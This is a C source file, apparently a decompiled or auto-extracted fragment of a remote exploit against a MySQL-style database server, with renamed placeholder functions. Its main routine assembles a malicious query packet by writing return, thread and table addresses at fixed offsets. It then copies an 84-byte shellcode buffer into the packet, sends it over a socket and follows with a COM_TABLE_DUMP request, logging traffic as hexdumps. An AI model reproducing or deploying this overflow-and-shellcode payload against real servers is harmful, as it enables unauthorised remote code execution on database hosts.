#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int RET_POS ; 
 int SHL_POS ; 
 int TBL_POS ; 
 int THD_POS ; 
 char* addr_ret ; 
 char* addr_tbl ; 
 char* addr_tdh ; 
 char* buf ; 
 int d ; 
 int dump_packet_len ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int fd ; 
 scalar_t__ hexdump ; 
 scalar_t__ FUNC1 (unsigned char) ; 
 int /*<<< orphan*/  FUNC2 (char*,int /*<<< orphan*/ ,int) ; 
 int payload_len ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 char* query_payload ; 
 int FUNC5 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC6 (int,char*,int,int /*<<< orphan*/ ) ; 
 char* shcode ; 
 char* table_dump_packet ; 
 int tbl ; 
 int thd ; 
 int tmp_idx ; 

int
FUNC7 (char *buf1, int fdest, int dblen)
{
  int len1;
  int i = 0;
  int ret = 0;
  FUNC4 ("%d\n", d);
  if (d == 2)
    {
      // let's prepare the query packet 
      int o;
      int position = 14;

      tmp_idx = 3;


      int ret = tbl - 0x106 + 33;

      for (i = 0; i < 32; i += 8)
	addr_ret[tmp_idx--] = (ret >> i) & 0xff;

      tmp_idx = 3;
      for (i = 0; i < 32; i += 8)
	addr_tdh[tmp_idx--] = (thd >> i) & 0xff;

      tmp_idx = 3;
      for (i = 0; i < 32; i += 8)
	addr_tbl[tmp_idx--] = (tbl >> i) & 0xff;
      FUNC4 ("ret %x\n", ret);


#if 1
      tmp_idx = 0;
      for (o = THD_POS; o > THD_POS - 4; o--)
	query_payload[o] = addr_tdh[tmp_idx++];

      tmp_idx = 0;
      for (o = TBL_POS; o > TBL_POS - 4; o--)
	query_payload[o] = addr_tbl[tmp_idx++];

      tmp_idx = 0;
      for (o = RET_POS; o > RET_POS - 4; o--)
	query_payload[o] = addr_ret[tmp_idx++];
#else
      for (; position < payload_len - 12; position += 12)
	{
	  tmp_idx = 0;
	  printf ("p:%d\n", position);
	  for (o = position + 4; o > position; o--)
	    query_payload[o] = addr_ret[tmp_idx++];

	  tmp_idx = 0;
	  for (o = position + 8; o > position + 4; o--)
	    query_payload[o] = addr_tdh[tmp_idx++];

	  tmp_idx = 0;
	  for (o = position + 12; o > position + 8; o--)
	    query_payload[o] = addr_tbl[tmp_idx++];

	}

#endif

      tmp_idx = 0;
      for (o = SHL_POS; o < SHL_POS + 84; o++)
	query_payload[o] = shcode[tmp_idx++];

      FUNC4 ("entro\n");
      buf1 = query_payload;
      len1 = payload_len;
    }
  else if (d >= 3)
    {
      FUNC4 ("entro\n");

      // prepare table_dump request - PACK_LEN,  0x00,  0x00,  0x00,  COM_TABLE_DUMP (0x13),  DB_NAME_LEN (2) , RANDOM_CHAR (=0x73)
      buf1 = table_dump_packet;
      if (dblen >= 0)
	buf1[5] = (char) dblen;
      FUNC4 ("%x", (char) dblen);
      len1 = dump_packet_len;
    }
  d++;

  FUNC4 ("\nClient -> Server\n");
  if (hexdump)
    {
      for (i = 0; i < len1; i++)
	FUNC4 (" %.2x%c", (unsigned char) buf1[i],
		((i + 1) % 16 ? ' ' : '\n'));
      FUNC4 ("\n");
      for (i = 0; i < len1; i++)
	{
	  unsigned char f = (unsigned char) buf1[i];
	  FUNC4 (" %.2c%2c", (FUNC1 (f) ? f : '.'),
		  (((i + 1) % 16) ? ' ' : '\n'));
	}
    }
  if (FUNC6 (fd, buf1, len1, 0) != len1)
    {
      FUNC3 ("cli: send(buf3)");
      FUNC0 (1);
    }



  fdest = fd;

  FUNC2 (buf, 0, 65535);
  ret = FUNC5 (fdest, buf, 65535, 0);
  FUNC4 ("\nServer -> Client\n");
  if (hexdump)
    {
      for (i = 0; i < ret; i++)
	FUNC4 (" %.2x%c", (unsigned char) buf[i],
		((i + 1) % 16 ? ' ' : '\n'));
      FUNC4 ("\n");
      for (i = 0; i < ret; i++)
	{
	  unsigned char f = (unsigned char) buf[i];
	  FUNC4 (" %.2c%2c", (FUNC1 (f) ? f : '.'),
		  ((i + 1) % 16 ? ' ' : '\n'));
	}
    }
  else
    {
      FUNC4 ("\n%s\n", buf + 5);
    }
// printf("\nSending to client\n");
// ret= send(c, buf,  ret, 0);

  return 0;
}